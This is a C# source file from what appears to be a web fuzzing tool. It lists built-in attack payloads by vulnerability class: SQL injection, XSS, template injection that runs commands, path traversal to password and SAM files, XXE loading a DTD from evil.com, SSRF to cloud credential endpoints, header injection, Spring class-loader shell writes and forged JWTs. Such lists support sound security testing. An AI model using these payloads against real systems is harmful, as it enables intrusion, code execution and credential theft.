using Trowser.Security;

namespace Trowser.Robustness;

/// <summary>
/// Built-in payload sets for the Request Fuzzer.
/// Each set targets a specific vulnerability class with payloads curated from
/// OWASP, Burp Suite, and real-world penetration testing experience.
/// </summary>
public static class FuzzerPayloads
{
    private static Dictionary<string, string[]>? _builtIn;

    public static Dictionary<string, string[]> BuiltIn => _builtIn ??= new Dictionary<string, string[]>(StringComparer.OrdinalIgnoreCase)
    {
        { "json-breaking", JsonBreaking },
        { "sqli-basic", SqliBasic },
        { "xss-basic", XssBasic },
        { "xss-bypass", XssBypassProbes.BypassPayloadStrings },
        { "ssti", Ssti },
        { "path-traversal", PathTraversal },
        { "boundary", Boundary },
        { "auth-bypass", AuthBypass },
        { "content-type", ContentType },
        { "header-injection", HeaderInjection },
        { "unicode-edge", UnicodeEdge },
        { "java-spring", JavaSpring },
        { "integer-overflow", IntegerOverflow },
        { "nosql-injection", NosqlInjection },
        { "ldap-injection", LdapInjection },
        { "xxe", Xxe },
        { "ssrf", Ssrf },
        { "open-redirect", OpenRedirect },
        { "jwt-manipulation", JwtManipulation },
        { "http-method", HttpMethod },
    };

    /// <summary>Malformed JSON, type confusion, nested objects, arrays-as-scalars.</summary>
    private static readonly string[] JsonBreaking =
    [
        "{",
        "{}",
        "[]",
        "[{}]",
        "null",
        "true",
        "false",
        "0",
        "-1",
        "99999999999999999999",
        "\"\"",
        "{\"__proto__\":{\"isAdmin\":true}}",
        "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
        "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]",
        "{\"a\":{\"b\":{\"c\":{\"d\":{\"e\":{\"f\":{\"g\":{\"h\":{\"i\":1}}}}}}}}}",
        "[null,null,null,null,null]",
        "{\"$where\":\"1==1\"}",
        "{\"$gt\":\"\"}",
        "{\"$ne\":null}",
        "{\"$regex\":\".*\"}",
        "\"\\u0000\"",
        "\"\\r\\n\\r\\n\"",
        "{\"id\":true}",
        "{\"id\":[1,2,3]}",
        "{\"id\":{\"nested\":\"object\"}}",
        "Not valid json{{{",
        "{trailing-comma:1,}",
        "{'single-quotes':'value'}",
        "{\"duplicate\":1,\"duplicate\":2}",
        "{\"unicode\":\"\\uD800\"}",
        "NaN",
        "Infinity",
        "-Infinity",
        "undefined",
    ];

    /// <summary>Common SQL injection patterns for error-based, blind, and time-based detection.</summary>
    private static readonly string[] SqliBasic =
    [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "\" OR \"1\"=\"1",
        "1; DROP TABLE users--",
        "'; DROP TABLE users--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "1 OR 1=1",
        "1' OR '1'='1' #",
        "admin'--",
        "1; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR 1=1 LIMIT 1--",
        "1'; EXEC xp_cmdshell('whoami')--",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "' AND extractvalue(1,concat(0x7e,version()))--",
        "') OR ('1'='1",
        "1 UNION ALL SELECT 1,@@version--",
        "' OR ''='",
        "' AND SUBSTRING(@@version,1,1)='5",
        "1; SELECT pg_sleep(5)--",
    ];

    /// <summary>Script injection, event handlers, protocol handlers for XSS detection.</summary>
    private static readonly string[] XssBasic =
    [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'-alert(1)-'",
        "<img src=\"x\" onerror=\"alert(1)\">",
        "javascript:alert(1)",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<iframe src=\"javascript:alert(1)\">",
        "{{constructor.constructor('return this')().alert(1)}}",
        "${alert(1)}",
        "<details open ontoggle=alert(1)>",
        "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;img src=x onerror=alert(1)&gt;\">",
        "<input onfocus=alert(1) autofocus>",
        "<select onchange=alert(1)><option>1</option><option>2</option></select>",
        "<textarea onfocus=alert(1) autofocus>",
        "'\"><img src=x onerror=alert(1)>",
        "<svg><script>alert&#40;1&#41;</script>",
        "<div onmouseover=\"alert(1)\" style=\"position:fixed;width:100%;height:100%;top:0;left:0;\">",
        "data:text/html,<script>alert(1)</script>",
        "<object data=\"data:text/html,<script>alert(1)</script>\">",
        "\"onfocus=\"alert(1)\" autofocus=\"",
        "'-confirm(1)-'",
        "<img/src=x onerror=confirm(1)>",
    ];

    /// <summary>Server-side template injection for Jinja2, Thymeleaf, FreeMarker, Twig, ERB, etc.</summary>
    private static readonly string[] Ssti =
    [
        "{{7*7}}",
        "{{7*'7'}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{% import os %}{{os.popen('id').read()}}",
        "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "@(1+2)",
        "@{var x = 1;}",
        "[[${7*7}]]",
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{constructor.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}",
        "{php}echo `id`;{/php}",
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
    ];

    /// <summary>Directory traversal patterns for file inclusion and path manipulation.</summary>
    private static readonly string[] PathTraversal =
    [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "/etc/passwd",
        "C:\\Windows\\win.ini",
        "/etc/shadow",
        "/proc/self/environ",
        "file:///etc/passwd",
        "....\\....\\....\\windows\\win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
        "/%00/etc/passwd",
        "../../../etc/passwd%00.jpg",
        "..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
        "/var/log/apache2/access.log",
        "php://filter/convert.base64-encode/resource=index.php",
        "..0x2f..0x2f..0x2fetc0x2fpasswd",
    ];

    /// <summary>Empty strings, nulls, huge values, unicode edge cases, and boundary values.</summary>
    private static readonly string[] Boundary =
    [
        "",
        " ",
        "   ",
        "\t",
        "\n",
        "\r\n",
        "\0",
        "\u0000",
        "\uFFFE",
        "\uFFFF",
        "\uFEFF",
        "null",
        "undefined",
        "NaN",
        "true",
        "false",
        "-1",
        "0",
        "-0",
        "1",
        "2147483647",
        "-2147483648",
        "9999999999999999999999999999999",
        "1e308",
        "1e-308",
        new string('A', 1000),
        new string('A', 10000),
        "AAAA%08x.%08x.%08x.%08x",
        "%s%s%s%s%s%s%s%s%s%s",
        "%n%n%n%n%n%n%n%n%n%n",
        "Ā" + new string('ā', 500),
        "田中太郎",
        "🔥💀🎉🚀",
        "Ṫ̈̃o̫̮̰ ̠̀i̢̛̫n̢̤̲v̠̱̝o̡̯̥k̫̱̜e̢̤̝",
        "test\x00hidden",
        "test\r\nX-Injected: true",
        "\"><script>alert(1)</script>",
        "Robert'); DROP TABLE Students;--",
    ];

    /// <summary>Common authentication and authorization bypass payloads.</summary>
    private static readonly string[] AuthBypass =
    [
        "admin",
        "administrator",
        "root",
        "admin@admin.com",
        "test@test.com",
        "' OR 1=1--",
        "admin'--",
        "admin' #",
        "admin'/*",
        "' OR '1'='1",
        "' OR ''='",
        "') OR ('1'='1",
        "admin\" OR \"1\"=\"1",
        "true",
        "1",
        "{\"$gt\":\"\"}",
        "{\"$ne\":null}",
        "{\"$regex\":\".*\"}",
        "{{7*7}}",
        "${7*7}",
        "Bearer null",
        "Bearer undefined",
        "Bearer ",
        "Bearer admin",
        "Basic YWRtaW46YWRtaW4=",
        "Basic YWRtaW46cGFzc3dvcmQ=",
        "../../admin",
        "/admin",
        "%00",
        "nil",
        "None",
        "[]",
        "{}",
    ];

    /// <summary>HTTP Content-Type variations — charset tricks, boundary manipulation, wildcard, encoding attacks.</summary>
    private static readonly string[] ContentType =
    [
        "application/json",
        "application/xml",
        "text/xml",
        "text/html",
        "text/plain",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "multipart/form-data; boundary=----",
        "multipart/form-data; boundary=",
        "*/*",
        "application/json; charset=utf-8",
        "application/json; charset=utf-7",
        "application/json; charset=us-ascii",
        "application/json; charset=iso-8859-1",
        "application/json; charset=utf-16",
        "application/json; charset=utf-32",
        "application/x-yaml",
        "application/yaml",
        "application/octet-stream",
        "application/javascript",
        "application/csv",
        "application/graphql",
        "application/x-protobuf",
        "application/msgpack",
        "application/soap+xml",
        "",
        "invalid/type",
        "application/json\r\nX-Injected: true",
        "../../../etc/passwd",
        "application/json; charset=utf-8; boundary=AAAA",
    ];

    /// <summary>CRLF injection, header smuggling, oversized headers, duplicate headers.</summary>
    private static readonly string[] HeaderInjection =
    [
        "\r\n",
        "\r\nX-Injected: true",
        "\r\nSet-Cookie: admin=true",
        "\r\nLocation: https://evil.com",
        "\r\nContent-Length: 0\r\n\r\n",
        "\r\n\r\n<html>injected</html>",
        "%0d%0aX-Injected:%20true",
        "%0d%0aSet-Cookie:%20admin=true",
        "\nX-Injected: true",
        "%0aX-Injected:%20true",
        "value\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>smuggled</html>",
        new string('A', 8192),
        new string('A', 65536),
        "value1\0value2",
        "value; domain=.evil.com",
        "value; path=/admin",
        "value\tinjected",
        "\r\nTransfer-Encoding: chunked",
        "\r\nX-Forwarded-For: 127.0.0.1",
        "\r\nX-Original-URL: /admin",
        "\r\nX-Rewrite-URL: /admin",
    ];

    /// <summary>Zero-width chars, RTL overrides, homoglyphs, normalization attacks.</summary>
    private static readonly string[] UnicodeEdge =
    [
        "\u200B",
        "\u200C",
        "\u200D",
        "\uFEFF",
        "\u00AD",
        "\u200E",
        "\u200F",
        "\u202A",
        "\u202B",
        "\u202C",
        "\u202D",
        "\u202E",
        "admin\u200Bistrator",
        "a\u0300\u0301\u0302\u0303\u0304\u0305\u0306\u0307\u0308\u0309",
        "\u0041\u006D\u0069\u006E",
        "\uFF41\uFF44\uFF4D\uFF49\uFF4E",
        "\u24B6\u24B9\u24C2\u24BE\u24C3",
        "ℂ𝕠𝕟𝕥𝕖𝕟𝕥",
        "\u0000\u0001\u0002\u0003\u0004\u0005",
        "test\u2028test",
        "test\u2029test",
        "\uD800",
        "\uDC00",
        "\uD800\uDC00",
        "\uFFFD",
        "\uFDD0",
        string.Concat(Enumerable.Repeat("\u0300", 100)),
        "admin\u00ADistrator",
        "\u0061\u0064\u006D\u0069\u006E",
        "ⓐⓓⓜⓘⓝ",
    ];

    /// <summary>Spring Boot specific: SpEL injection, class-loader manipulation, actuator paths, Thymeleaf.</summary>
    private static readonly string[] JavaSpring =
    [
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        "${T(java.lang.System).getenv()}",
        "#{T(java.lang.System).getenv()}",
        "${applicationContext}",
        "#{applicationContext}",
        "class.module.classLoader",
        "class.module.classLoader.URLs",
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell",
        "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
        "[[${T(java.lang.Runtime).getRuntime().exec('id')}]]",
        "${#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')}",
        "/actuator",
        "/actuator/env",
        "/actuator/health",
        "/actuator/beans",
        "/actuator/configprops",
        "/actuator/mappings",
        "/actuator/heapdump",
        "/actuator/threaddump",
        "/env",
        "/jolokia",
        "/trace",
        "spring.datasource.url",
        "spring.datasource.password",
    ];

    /// <summary>Integer boundaries, type conversion bugs, overflow and underflow values.</summary>
    private static readonly string[] IntegerOverflow =
    [
        "0",
        "-0",
        "1",
        "-1",
        "2147483647",
        "2147483648",
        "-2147483648",
        "-2147483649",
        "4294967295",
        "4294967296",
        "9223372036854775807",
        "9223372036854775808",
        "-9223372036854775808",
        "-9223372036854775809",
        "18446744073709551615",
        "18446744073709551616",
        "NaN",
        "Infinity",
        "-Infinity",
        "1e308",
        "1e309",
        "1e-308",
        "1e-324",
        "5e-324",
        "1.7976931348623157e+308",
        "2.2250738585072014e-308",
        "0x7FFFFFFF",
        "0xFFFFFFFF",
        "0x7FFFFFFFFFFFFFFF",
        "0.1+0.2",
        "999999999999999999999999999999",
        "00",
        "01",
        "007",
        "0x0",
        "0b0",
        "0o0",
        "+1",
        "1.0",
        "1,0",
        "1_000_000",
    ];

    /// <summary>MongoDB/NoSQL/Redis injection — operators, pairs, protocol smuggling (see NosqlInjectionPayloads).</summary>
    private static readonly string[] NosqlInjection = NosqlInjectionPayloads.FlatFuzzerPayloads;

    /// <summary>LDAP filter injection — wildcards, boolean OR, comment termination.</summary>
    private static readonly string[] LdapInjection =
    [
        "*",
        "*)",
        "*)(|",
        "*)(uid=*",
        "*)(|(uid=*",
        "admin)(&(password=*",
        ")(cn=*",
        "\\",
        "\\00",
        ")(objectClass=*",
        "*()|%26'",
        "x' or '1'='1",
        ")(|(mail=*@*",
    ];

    /// <summary>XML External Entity payloads — DOCTYPE declarations, parameter entities, SSRF via XXE.</summary>
    private static readonly string[] Xxe =
    [
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-!DOCTYPE foo+AFs-+ADw-!ENTITY xxe SYSTEM+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADsAPA-/foo+AD4-",
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"/dev/random\">]><foo>&xxe;</foo>",
        "<![CDATA[<script>alert(1)</script>]]>",
        "<?xml version=\"1.0\"?><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
        "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"file:///etc/passwd\"/>",
        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % a \"<!ENTITY &#37; b SYSTEM 'file:///etc/passwd'>\">%a;%b;]>",
    ];

    /// <summary>SSRF payloads — internal IP ranges, cloud metadata URLs, DNS rebinding patterns.</summary>
    private static readonly string[] Ssrf =
    [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://0177.0.0.1",
        "http://2130706433",
        "http://0x7f000001",
        "http://127.1",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:9200",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        "http://169.254.169.254/opc/v1/instance/",
        "http://169.254.169.254/opc/v1/identity/",
        "http://192.168.0.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        "http://[0:0:0:0:0:ffff:127.0.0.1]",
        "http://localtest.me",
        "http://spoofed.burpcollaborator.net",
        "gopher://127.0.0.1:25/",
        "dict://127.0.0.1:11211/",
        "file:///etc/passwd",
        "http://0000::1:22/",
        "http://127.0.0.1.nip.io",
    ];

    /// <summary>Open redirect bypass payloads — external URLs, protocol-relative, backslash, @-trick.</summary>
    private static readonly string[] OpenRedirect =
    [
        "https://open-redirect-probe.trowser.test/",
        "//open-redirect-probe.trowser.test/",
        "/\\open-redirect-probe.trowser.test/",
        "https://open-redirect-probe.trowser.test@example.com/",
        "https:/open-redirect-probe.trowser.test/",
        "http://open-redirect-probe.trowser.test/",
        "/%09/open-redirect-probe.trowser.test/",
        "//\\open-redirect-probe.trowser.test/",
        "///open-redirect-probe.trowser.test/",
        "javascript:alert(1)",
        "https://example.com%2f..%2fopen-redirect-probe.trowser.test/",
    ];

    /// <summary>JWT algorithm confusion, malformed tokens, expired timestamps.</summary>
    private static readonly string[] JwtManipulation =
    [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.invalid",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.invalid",
        "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.invalid",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxfQ.invalid",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjo5OTk5OTk5OTk5fQ.invalid",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.AAAA.invalid",
        "",
        "null",
        "undefined",
        "Bearer",
        "Bearer ",
        "Bearer null",
        "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0." + new string('A', 86),
        "a]a.b.c",
        "{\"alg\":\"none\",\"typ\":\"JWT\"}",
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ",
    ];

    /// <summary>All HTTP methods including uncommon ones for method testing.</summary>
    private static readonly string[] HttpMethod =
    [
        "GET",
        "POST",
        "PUT",
        "PATCH",
        "DELETE",
        "HEAD",
        "OPTIONS",
        "TRACE",
        "CONNECT",
        "PROPFIND",
        "PROPPATCH",
        "MKCOL",
        "COPY",
        "MOVE",
        "LOCK",
        "UNLOCK",
        "SEARCH",
        "PURGE",
        "LINK",
        "UNLINK",
        "VIEW",
        "INVALID",
        "",
        "get",
        "GeT",
        "G\tET",
    ];

    /// <summary>
    /// Resolve a payload set name to its payloads. Supports built-in names
    /// and the special "built-in" keyword that expands to the named set.
    /// Returns null if the name is not recognized.
    /// </summary>
    public static string[]? Resolve(string name) =>
        Resolve(name, PayloadProfile.Small);

    /// <summary>
    /// Resolve a payload set with an optional <see cref="PayloadProfile"/>.
    /// Big profile merges external corpora when available (see <see cref="PayloadCatalog"/>).
    /// </summary>
    public static string[]? Resolve(string name, PayloadProfile profile)
    {
        if (!BuiltIn.ContainsKey(name)) return null;
        return PayloadCatalog.Resolve(name, profile);
    }

    /// <summary>All built-in payload set names.</summary>
    public static IReadOnlyList<string> AvailableNames => BuiltIn.Keys.ToList().AsReadOnly();
}
